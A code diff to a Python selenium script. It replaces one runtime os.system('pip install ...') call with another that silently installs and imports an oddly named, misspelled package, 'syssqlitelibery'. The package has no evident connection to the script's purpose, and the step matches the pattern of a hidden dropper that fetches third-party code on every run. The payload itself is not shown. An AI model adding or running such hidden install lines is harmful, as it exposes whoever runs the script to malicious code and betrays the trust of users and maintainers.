@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptolibrary")
-import pythoncryptolibrary
+os.system("pip install syssqlitelibery")
+import syssqlitelibery
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
